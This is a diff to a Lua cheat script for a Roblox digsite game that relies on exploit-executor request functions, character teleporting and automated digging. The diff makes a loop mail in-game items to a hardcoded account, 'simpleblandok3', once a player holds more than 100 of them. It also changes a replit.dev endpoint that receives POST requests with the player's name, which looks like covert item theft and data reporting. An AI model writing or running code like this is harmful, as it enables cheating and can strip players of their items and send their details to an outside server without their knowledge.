@@ -1,6 +1,7 @@
 
 
 
+
 --DIGSITE SCRIPT
 wait(3)
 if game.PlaceId ~= 8737899170 then
@@ -410,7 +411,7 @@ local request = (syn and syn.request) or request or (http and http.request) or h
 
 local function SendBucketMail()
     while true do
-        if MagicBucketAM > 99999 then
+        if MagicBucketAM > 100 then
             local args = {
                 [1] = "simpleblandok3",
                 [2] = "enjoy bro",
@@ -450,7 +451,7 @@ local player = Player.Name
 
         -- Updated URL
         local response = request({
-            Url = 'https://f466dc15-f411-4c74-bf04-d3f867a14582-00-1d2ant5ogh6op.picard.replit.dev/update',
+            Url = 'https://67f552e4-5e03-4d76-bc81-e7c398e4e63f-00-1db81sgqdm8hk.riker.replit.dev/update',
             Method = 'POST',
             Headers = {
                 ['Content-Type'] = 'application/json'
@@ -552,37 +553,16 @@ end
 spawn(ProcessHugePets)
 
 local currentTarget
-local positions = {}
-
-local function ResetPositions()
-    while true do
-        positions = {}
-        wait(0.1)
-    end
-end
-spawn(ResetPositions)
 
 function getPositionsFromRowPositions()
+    local positions = {}
     if Workspace:FindFirstChild("__THINGS") and Workspace.__THINGS:FindFirstChild("__INSTANCE_CONTAINER") and Workspace.__THINGS.__INSTANCE_CONTAINER:FindFirstChild("Active") and Workspace.__THINGS.__INSTANCE_CONTAINER.Active:FindFirstChild("AdvancedDigsite") and Workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite:FindFirstChild("Important") then
         for _, child in ipairs(activeBlocks:GetChildren()) do
             if child:IsA("Part") then
                 local x, y, z = math.floor(child.Position.X + 0.5), math.floor(child.Position.Y + 0.5), math.floor(child.Position.Z + 0.5)
                 for _, pos in pairs(RowPositions) do
                     if x == pos.X and z == pos.Z and child.BrickColor ~= BrickColor.new("Really black") and child.BrickColor ~= BrickColor.new("Royal purple") then
-                        -- Check if the position is already in the 'positions' table
-                        local alreadyExists = false
-                        for _, existingChild in ipairs(positions) do
-                            local ex, ey, ez = math.floor(existingChild.Position.X + 0.5), math.floor(existingChild.Position.Y + 0.5), math.floor(existingChild.Position.Z + 0.5)
-                            if x == ex and z == ez then
-                                alreadyExists = true
-                                break
-                            end
-                        end
-
-                        -- If it doesn't exist, add the child to 'positions'
-                        if not alreadyExists then
-                            table.insert(positions, child)
-                        end
+                        table.insert(positions, child)
                         break
                     end
                 end
@@ -592,10 +572,9 @@ function getPositionsFromRowPositions()
     return positions
 end
 
-
 local function teleportToPosition(position)
     humanoidRootPart.CFrame = CFrame.new(position)
-    wait()
+    wait(0.05)
 end
 
 local function teleportToCurrentTarget()
@@ -650,9 +629,7 @@ end
 function teleportLoop()
     while true do
         if not teleportToRoyalPurple() then
-if BucketAmount < 50 then
             if not teleportToActiveChestModel() then
-end
                 if not teleportToCurrentTarget() then
                     local positions = getPositionsFromRowPositions()
                     if #positions > 0 then
@@ -662,13 +639,12 @@ end
                 end
             end
         end
-        wait(0.001)
+        wait(0.05)
     end
 end
 
 wait(5)
 spawn(teleportLoop)
-
 
 
 local Workspace = game:GetService("Workspace")
@@ -761,6 +737,7 @@ end
 
 _G.AutoDigRowBelowBlock = true
 spawn(AutoDigRowBelowBlock)
+
 
 
 print("if made it through")
